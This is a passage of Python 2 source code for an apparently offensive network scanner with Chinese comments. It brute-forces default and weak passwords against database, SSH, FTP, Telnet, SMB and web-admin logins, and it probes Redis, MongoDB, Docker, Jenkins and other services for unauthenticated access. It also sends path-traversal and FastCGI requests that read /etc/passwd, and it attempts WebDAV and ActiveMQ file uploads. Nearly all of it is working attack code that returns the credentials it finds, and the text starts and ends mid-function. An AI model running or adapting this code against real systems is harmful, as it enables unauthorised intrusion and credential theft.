        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'UM_distinctid=165af67ee6f352-07238a34ed3941-9393265-1fa400-165af67ee70473; CNZZDATA5082706=cnzz_eid%3D832961605-1544438317-null%26ntime%3D1544443717; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; qHistory=aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9iYWlkdW1vYmlsZS8r55m+5bqm56e75Yqo5p2D6YeNfGh0dHA6Ly9yYW5rLmNoaW5hei5jb20vcmFua2FsbC8r5p2D6YeN57u85ZCI5p+l6K+ifGh0dHA6Ly9yYW5rLmNoaW5hei5jb20r55m+5bqm5p2D6YeN5p+l6K+ifGh0dHA6Ly9pbmRleC5jaGluYXouY29tLyvlhbPplK7or43lhajnvZHmjIfmlbB8aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9yYW5rL2hpc3RvcnkuYXNweCvmnYPph43ljoblj7Lmn6Xor6I=',
        'Host': 'rank.chinaz.com',
        'Origin': 'http://rank.chinaz.com',
        'Referer': 'http://rank.chinaz.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'

    }
    try:
        urls = 'http://rank.chinaz.com/ajaxseo.aspx?t=rankall&on=1&type=undefined&callback=jQuery111303146901980779846_154444474116%s' % (x)

        r = requests.post(url=urls, headers=headers, data=data)
        try:
            res = re.search(',"br":(\d),"beforBr',r.content).group(1)
        except:
            pass
        if res:
            return res
        else:
            return 'None'
    except:
        pass

'''
获取网址的权重
res = get_baidu_weights('https://www.google.com')

print res 

>>> 6
'''

def scan_database(url):
    ip = get_ip(url)
    if ip == None:
        return None
    print unicode('检测数据库弱口令中.....', 'utf-8')
    for username in mysql_user_list:
        for password in mysql_password_list:
            try:
                connx = pymysql.connect(host=ip, user=username, passwd=password, db='mysql', port=3306)
                return ip + ':' + str(3306) + '|' + username + ':' + password
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass

    for username in mssql_user_list:
        for password in mssql_password_list:
            try:
                connx = pymssql.connect(server=str(ip), port=1433, user=username, password=password)
                return ip + ':' + str(1433) + '|' + username + ':' + password
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass

    for username in postql_user_list:
        for password in postql_password_list:
            try:
                connx = psycopg2.connect(host=ip, port=5432, user=username, password=password)
                return ip + ':' + str(5432) + '|' + username + ':' + password
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass
    # for username in oracle_user_list:
    #     for password in oracle_password_list:
    #         try:
    #             connx = cx_Oracle.connect(username, password, ip + ':%s/orcl' % str(1521))
    #             return ip + ':' + str(1521) + '|' + username + ':' + password
    #         except Exception, e:
    #             writedata('[WARNING ERROR]  ' + str(e))
    #             pass
    for username in system_user_list:
        for password in system_passwords_list:
            try:
                # telnetlib.Telnet(ip, 111, timeout=2)#判断额外端口的
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
                ssh.connect(ip, 22, '', '', timeout=timeout)
                ssh.close()
            except Exception as e:
                if 'Authentication' in str(e):  # 捕获所有的异常，根据返回信息，判断是否是ssh的，决定是否往下爆破。
                    try:
                        ssh.connect(ip, 22, username, password, timeout=timeout)
                        # print(colored(ip + ' ' + us + ' ' + pa + ' ' + '连接成功~~~~~~~', 'red'))
                        # open(outfile, 'a', encoding='utf-8').write(ip + ' ' + us + ' ' + pa + '\n')  # 成功了，就写入文本
                        # data_text = ip + ' ' + us + ' ' + pa
                        ssh.close()
                        return ip + ':' + str(22) + '|' + username + ':' + password
                    except Exception as e:
                        writedata('[WARNING ERROR]  ' + str(e))
                        ssh.close()
                else:
                    pass
                    # print(ip, str(e))

            try:
                ftp = FTP(ip)
                ftp.connect(ip, 21)
                ftp.login(username, password)
                if 'Not implemented' in ftp.dir():
                    pass
                else:
                    return ip + ':' + str(21) + '|' + username + ':' + password
                ftp.quit()
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))

            try:
                res = ''
                s = socket.socket()
                s.connect((str(ip), 23))
                s.send('langzi \n')
                cc = s.recv(1024)
                s.close()
                if 'not allowed to' not in cc:
                    tn = telnetlib.Telnet(ip, timeout=timeout)
                    tn.set_debuglevel(5)
                    time.sleep(0.5)
                    oss = tn.read_some()
                    s.close()
                    user_match = "(?i)(login|user|username)"
                    pass_match = '(?i)(password|pass)'
                    login_match = '#|\$|>'
                    if re.search(user_match, oss):
                        try:
                            tn.write(username + '\r\n')
                            tn.read_until(pass_match, timeout=2)
                            tn.write(password + '\r\n')
                            login_info = tn.read_until(login_match, timeout=3)
                            tn.close()
                            if re.search(login_match, login_info):
                                res = ip + ':' + str(23) + '|' + username + ':' + password
                                return res
                        except Exception, e:
                            writedata('[WARNING ERROR]  ' + str(e))
                            pass
                    else:
                        try:
                            info = tn.read_until(user_match, timeout=2)
                        except Exception, e:
                            writedata('[WARNING ERROR]  ' + str(e))
                            pass
                        if re.search(user_match, info):
                            try:
                                tn.write(username + '\r\n')
                                tn.read_until(pass_match, timeout=2)
                                tn.write(password + '\r\n')
                                login_info = tn.read_until(login_match, timeout=3)
                                tn.close()
                                if re.search(login_match, login_info):
                                    res = ip + ':' + str(23) + '|' + username + ':' + password
                                    return res
                            except Exception, e:
                                writedata('[WARNING ERROR]  ' + str(e))
                                pass
                        elif re.search(pass_match, info):
                            tn.read_until(pass_match, timeout=2)
                            tn.write(password + '\r\n')
                            login_info = tn.read_until(login_match, timeout=3)
                            tn.close()
                            if re.search(login_match, login_info):
                                res = ip + ':' + str(23) + '|' + username + ':' + password
                                return res
                else:
                    pass
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))
                pass

            if res == '':
                pass
            else:
                return res

    for username in system_user_list:
        for password in system_passwords_list:
            try:
                hostname = ip2hostname(ip)
                if hostname:
                    try:
                        conn = SMBConnection(username, password, 'xunfeng', hostname)
                        if conn.connect(ip) == True:
                            return ip + ':' + str(445) + '|' + username + ':' + password
                    except Exception, e:
                        writedata('[WARNING ERROR]  ' + str(e))
            except Exception, e:
                writedata('[WARNING ERROR]  ' + str(e))


'''
传入ip，用户名，密码
如果存在弱口令就返回
不存在就返回None


print scan_database('http://www.langzi.fun')
返回的内容：127.0.0.1:3306|root:root  #(字符串形式)
'''

# URL未授权漏洞合集

user_list = ['root', 'sa', 'system', 'Administrtor', 'ubuntu']

password_list = ['root', 'sa', 'admin', 'test', 'mysql', '123456', 'admin1234', 'admin12345', '000000', '987654321',
                 '1234', '12345']

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1


def scan_url(url):
    print unicode('检测未授权漏洞中.....', 'utf-8')
    result = []
    try:
        r_ = []
        r1_1_1 = url + '/phpinfo.php'
        r1_1_2 = url + '/info.php'
        r1_1_3 = url + '/pi.php'
        r1_1_4 = url + '/php.php'
        r1_1_5 = url + '/i.php'
        r1_1_6 = url + '/mysql.php'
        r1_1_7 = url + '/sql.php'
        r1_1_8 = url + '/test.php'
        r1_1_9 = url + '/x.php'
        r1 = url + '/1.php'
        r1_zz = url + '/l.php'
        r2 = url + '/tz/tz.php'
        r4 = url + '/env.php'
        r6 = url + '/tz.php'
        r7 = url + '/p1.php'
        r8 = url + '/p.php'
        r1_0 = url + '/admin_aspcheck.asp'
        r2_0 = url + '/tz/tz.asp'
        r4_0 = url + '/env.asp'
        r6_0 = url + '/tz.asp'
        r7_0 = url + '/p1.asp'
        r7_0_zz = url + '/l.asp'
        r8_0 = url + '/p.asp'
        r4_0_0 = url + '/aspcheck.asp'
        r_.append(r1)
        r_.append(r1_zz)
        r_.append(r2)
        r_.append(r4)
        r_.append(r6)
        r_.append(r7)
        r_.append(r8)
        r_.append(r1_0)
        r_.append(r2_0)
        r_.append(r4_0)
        r_.append(r6_0)
        r_.append(r7_0)
        r_.append(r7_0_zz)
        r_.append(r8_0)
        r_.append(r4_0_0)
        r_.append(r1_1_1)
        r_.append(r1_1_2)
        r_.append(r1_1_3)
        r_.append(r1_1_4)
        r_.append(r1_1_5)
        r_.append(r1_1_6)
        r_.append(r1_1_7)
        r_.append(r1_1_8)
        r_.append(r1_1_9)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                rxr = requests.get(url=r_r, headers=headers, timeout=10)
                writedata('[SCAN INFO_URL]  ' + str(r_r))
                if 'upload_max_filesize' in rxr.content or 'SoftArtisans.FileManager' in rxr.content:
                    result.append('服务器探针信息泄露:' + r_r)
                else:
                    pass
            except:
                pass
    except:
        pass

    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        rr = requests.get(url=str(url + '/_config'), headers=headers, timeout=5)
        if "couch" in rr.content:
            result.append('CouchDB未授权访问漏洞:' + rr.url.strip('/'))
    except:
        pass

    try:
        r_ = []
        r1 = url + '/script'
        r3 = url + ':8080/script'
        r_.append(r1)
        r_.append(r3)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                rxr = requests.get(url=r_r, headers=headers, timeout=8)
                if 'arbitrary' in rxr.content:
                    result.append('Jenkins未授权访问漏洞:' + rxr.url.strip('/'))
            except:
                pass
    except:
        pass

    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        rrr = requests.get(url=str(url + '/servlets-examples/'), headers=headers, timeout=5)
        if 'servlet/RequestParamExample' in rrr.content:
            result.append('Tomcat example 应用信息泄漏漏洞:' + rrr.url.strip('/'))
    except:
        pass

    try:
        r_ = []
        r1 = url + '/resin-doc/admin/index.xtp'
        r3 = url + ':8080/resin-doc/admin/index.xtp'
        r5 = url + ':8443/resin-doc/admin/index.xtp'
        r_.append(r1)
        r_.append(r3)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, headers=headers, timeout=8)
                if '/resin-doc/examples/index.xtp' in rxr.content:
                    result.append('Resin viewfile远程文件读取漏洞:' + r_r)
            except:
                pass
    except:
        pass

    try:
        r_ = []
        r1 = url + '/jmx-console/'
        r3 = url + ':8080/jmx-console/'
        r_.append(r1)
        r_.append(r3)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, headers=headers, timeout=8)
                if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                    result.append('JBoss后台上传漏洞:' + r_r)
            except:
                pass
    except:
        pass

    try:
        r_ = []
        r1 = url + '/console/login/LoginForm.jsp'
        r3 = url + ':7001/console/login/LoginForm.jsp'
        r7 = url + ':7002/console/login/LoginForm.jsp'
        r_.append(r1)
        r_.append(r3)
        r_.append(r7)
        for r_r in r_:
            try:
                for uuser in user_list:
                    for ppass in password_list:
                        data = {'j_username': str(uuser), 'j_password': str(ppass), 'j_character_encoding': 'GBK'}
                        rxr = requests.post(url=r_r, data=data, headers=headers, timeout=8)
                        if 'WebLogic Server Console' in rxr.content:
                            result.append('Weblogic弱口令漏洞:' + r_r + ':' + uuser + '|' + ppass)
            except:
                pass
    except:
        pass

    try:
        r_ = []
        r1 = url + '/RetainServer/Manager/login.jsp'
        r2 = url + '/Manager/login.jsp'
        r_.append(r1)
        r_.append(r2)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, headers=headers, timeout=10)
                if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'login': str(uuser), 'pass': str(ppass), 'Language': 'myLang'}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=10)
                                if 'Router Configuration' in r_br.content:
                                    result.append('Tomcat远程部署弱口令:' + r_r + ':' + uuser + '|' + ppass)
                            except:
                                pass
            except:
                pass
    except:
        pass



    try:
        r_ = []
        r1 = url + ':8080/manager/html'
        r3 = url + ':8081/manager/html'
        r_.append(r1)
        r_.append(r3)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, headers=headers, timeout=5)
                if 'Manager App HOW-TO' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            headers = {'Authorization': 'Basic %s==' % (base64.b64encode(uuser + ':' + ppass))}
                            try:
                                rxrx = requests.get(url=r_r, headers=headers, timeout=8)
                                if rxrx.status_code == 200:
                                    result.append('Tomcat后台管理弱口令:' + r_r + ':' + uuser + '|' + ppass)
                            except:
                                pass
            except:
                pass
    except:
        pass

    try:
        flag_list = ['<name>isAdmin</name>', '<name>url</name>']
        for uuser in user_list:
            for ppass in password_list:
                try:
                    login_path = '/xmlrpc.php'
                    PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (
                        uuser, ppass)
                    request = urllib2.Request(url + login_path, PostStr)
                    resa = urllib2.urlopen(request, timeout=5)
                    res_html = resa.read()
                    for flag in flag_list:
                        if flag in res_html:
                            result.append('Wordpress弱口令:' + url + login_path + ':' + uuser + '|' + ppass)
                except:
                    pass
    except:
        pass

    # Phpmyadmin弱口令漏洞
    try:
        r_ = []
        r1 = url + '/phpmyadmin/index.php'
        r2 = url + ':999/phpmyadmin/index.php'
        r4 = url + ':8080/phpmyadmin/index.php'
        r_.append(r1)
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=10)
                if 'Documentation.html' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'pma_username': str(uuser), 'pma_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=10)
                                if 'mainFrameset' in r_br.content:
                                    result.append('PHPmyadmin弱口令:' + r_r + ':' + uuser + '|' + ppass)
                            except:
                                pass
                else:
                    pass
            except:
                pass
    except:
        pass

    if result == []:
        return None
    else:
        return result


'''
    a = scan_url('http://www.langzi.fun')
    print a

    ['\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x99\xa8\xe6\x8e\xa2\xe9\x92\x88\xe4\xbf\xa1\xe6\x81\xaf\xe6\xb3\x84\xe9\x9c\xb2:http://127.0.0.1/l.php', '\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x99\xa8\xe6\x8e\xa2\xe9\x92\x88\xe4\xbf\xa1\xe6\x81\xaf\xe6\xb3\x84\xe9\x9c\xb2:http://127.0.0.1/phpinfo.php', 'PHPmyadmin\xe5\xbc\xb1\xe5\x8f\xa3\xe4\xbb\xa4:http://127.0.0.1/phpmyadmin/index.php:root|root']
    返回的内容是列表
    无则 None


'''


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1


def scan_ip(url):
    ip = get_ip(url)
    if ip == None:
        return None
    result = []
    try:
        conn = pymongo.MongoClient(str(ip), 27017)
        dbname = conn.database_names()
        if dbname:
            result.append('Mongodb数据库未授权访问漏洞 : ' + str(ip) + ':27017')
    except Exception, e:
        pass

    try:
        conn = pymongo.MongoClient(str(ip), 27018)
        dbname = conn.database_names()
        if dbname:
            result.append('Mongodb数据库未授权访问漏洞 : ' + str(ip) + ':27018')
    except Exception, e:
        pass

    try:
        s = socket.socket()
        s.connect((str(ip), 6379))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            result.append('Redis数据库未授权访问漏洞 : ' + str(ip) + ':6379')
    except Exception, e:
        pass
    finally:
        s.close()
    try:
        s = socket.socket()
        s.connect((ip, int(6379)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "Authentication" in result:
            for pass_ in password_list:
                s = socket.socket()
                s.connect((ip, int(6379)))
                s.send("AUTH %s\r\n" % (pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    result.append('Redis弱口令漏洞 : ' + str(ip) + ':6379|' + str(pass_))
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 2181))
        s.send("envi")
        result = s.recv(1024)
        if "zookeeper.version" in result:
            result.append('ZooKeeper未授权访问漏洞 : ' + str(ip) + ':2181')
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        conn = httplib.HTTPConnection(str(ip), 9200, True, timeout=timeout)
        conn.request("GET", '/_cat/master')
        resp = conn.getresponse()
        if resp.status == 200:
            result.append('Elasticsearch未授权访问漏洞 : ' + str(ip) + ':9200')
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 11211))
        s.send("stats")
        result = s.recv(1024)
        if "STAT version" in result:
            result.append('Memcache未授权访问漏洞 : ' + str(ip) + ':11211')
    except Exception, e:
        pass
    finally:
        s.close()

    try:

        r_ = []
        r3 = 'http://' + str(ip) + ':80'
        r4 = 'https://' + str(ip) + ':443'
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                flag_400 = '/otua*~1.*/.aspx'
                flag_404 = '/*~1.*/.aspx'
                request = urllib2.Request(r_r + flag_400)
                req = urllib2.urlopen(request, timeout=timeout)
                if int(req.code) == 400:
                    req_404 = urllib2.urlopen('http://' + r_r + flag_404, timeout=timeout)
                    if int(req_404.code) == 404:
                        result.append('IIS短文件名漏洞 : ' + str(r_r))
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        try:
            s = socket.socket()
            s.connect((ip, 80))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (ip, 80)
            s.send(flag)
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                url = 'http://' + ip + ":" + str(80) + '/vultest.txt'
                request = urllib2.Request(url)
                res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
                if 'xxscan0' in res_html:
                    result.append('IIS WebDav任意文件上传漏洞 : ' + str(url))
        except Exception, e:
            pass
        finally:
            s.close()
    except Exception, e:
        pass

    try:
        domain = url.replace('www.', '').replace('https://','').replace('http://','').replace('/','')
        cmd_res = os.popen(os.getcwd() + '\\BIND9.11.3.x64\\nslookup -type=ns ' + domain).read()  # fetch DNS Server List
        dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
        for server in dns_servers:
            if len(server) < 5: server += domain
            cmd_res = os.popen(os.getcwd() + '\\BIND9.11.3.x64\\dig @%s axfr %s' % (server, domain)).read()
            if cmd_res.find('Transfer failed.') < 0 and cmd_res.find('connection timed out') < 0 and cmd_res.find('XFR size') > 0:
                result.append('DNS域传送漏洞:' + url + ':' + ip)
    except:
        pass

    try:
        r_ = []
        r3 = 'http://' + str(ip) + ':8080/Manager/login.jsp'
        r4 = 'http://' + str(ip) + ':8080/RetainServer/Manager/login.jsp'
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'login': str(uuser), 'pass': str(ppass), 'Language': 'myLang'}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'Router Configuration' in r_br.content:
                                    result.append('Tomcat远程部署弱口令漏洞 : ' + r_r + ':' + uuser + '|' + ppass)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':8080/manager/html'
        r4 = 'http://' + str(ip) + ':8081/manager/html'
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'Manager App HOW-TO' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            headers = {'Authorization': 'Basic %s==' % (base64.b64encode(uuser + ':' + ppass))}
                            try:
                                rxrx = requests.get(url=r_r, headers=headers, timeout=timeout)
                                if rxrx.status_code == 200:
                                    result.append('Tomcat远程部署弱口令漏洞 : ' + r_r + ':' + uuser + '|' + ppass)
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        conn = httplib.HTTPConnection(str(ip), 2375, True, timeout=timeout)
        conn.request("GET", '/containers/json')
        resp = conn.getresponse()
        if resp.status == 200 and "HostConfig" in resp.read():
            result.append('Docker未授权访问漏洞 : ' + str(ip) + ':2375/containers/json')
    except Exception, e:
        pass
    finally:
        conn.close()

    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        rr = requests.get(url=str('http://' + str(ip) + '/_config'), headers=headers, timeout=timeout)
        if "couch" in rr.content:
            result.append('CouchDB未授权访问漏洞 : ' + str(rr.url))
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + '/manage '
        r4 = 'http://' + str(ip) + ':8080/manage '
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                rxr = requests.get(url=r_r, headers=headers, timeout=timeout)
                if 'arbitrary' in rxr.content:
                    result.append('Jenkins未授权访问漏洞 : ' + str(r_r))
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        s = socket.socket()
        s.connect((ip, 80))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (
            filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(80) + '/styles/%s.txt' % (filename)
        res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
        if 'xxscan0' in res_html:
            result.append('ActiveMQ任意文件上传漏洞 : ' + str(url))
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((ip, int(80)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            result.append('WebServer任意文件读取漏洞 : ' + str(ip) + ':80')
    except Exception, e:
        pass
    finally:
        s.close()
    try:
        s = socket.socket()
        s.connect((ip, int(443)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            result.append('WebServer任意文件读取漏洞 : ' + str(ip) + ':443')
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((ip, int(8080)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            result.append('WebServer任意文件读取漏洞 : ' + str(ip) + ':8080')
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 9000))
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_, 16))
        s.send(data_s)
        try:
            ret = s.recv(1024)
            if ret.find(':root:') > 0:
                result.append('Fast-Cgi文件读取漏洞 : ' + str(ip) + ':9000')
        except Exception, e:
            pass
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        r_ = []
        r3 = 'http://' + str(ip) + ':8080/phpmyadmin/index.php'
        r5 = 'http://' + str(ip) + ':999/phpmyadmin/index.php'
        r6 = 'http://' + str(ip) + ':80/phpmyadmin/index.php'
        r_.append(r3)
        r_.append(r5)
        r_.append(r6)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'Documentation.html' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'pma_username': str(uuser), 'pma_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'mainFrameset' in r_br.content:
                                    result.append(
                                        'PHPmyadmin弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass))))
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        s = socket.socket()
        s.connect((str(ip), 80))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
            result.append('HTTP.sys远程代码执行漏洞 : ' + str(ip) + ':80')
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        s = socket.socket()
        s.connect((str(ip), 443))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
            result.append('HTTP.sys远程代码执行漏洞 : ' + str(ip) + ':80')
    except Exception, e:
        pass
    finally:
        s.close()

    try:
        url = 'http://' + ip + ":" + str(80)
        res_html = urllib2.urlopen(url, timeout=timeout).read()
        if 'WebResource.axd?d=' in res_html:
            error_i = 0
            bglen = 0
            for k in range(0, 255):
                IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                bgstr = 'A' * 21 + '1'
                enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                try:
                    request = urllib2.Request(exp_url)
                    res = urllib2.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    res_code = res.code
                except urllib2.HTTPError, e:
                    res_html = e.read()
                    res_code = e.code
                except urllib2.URLError, e:
                    error_i += 1
                    if error_i >= 3: return
                except:
                    return
                if int(res_code) == 200 or int(res_code) == 500:
                    if k == 0:
                        bgcode = int(res_code)
                        bglen = len(res_html)
                    else:
                        necode = int(res_code)
                        if (bgcode != necode) or (bglen != len(res_html)):
                            result.append('.NET Padding Oracle信息泄露 : ' + str(url))
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':80/resin-doc/admin/index.xtp'
        r4 = 'http://' + str(ip) + ':8080/resin-doc/admin/index.xtp'
        r6 = 'http://' + str(ip) + ':8443/resin-doc/admin/index.xtp'
        r_.append(r2)
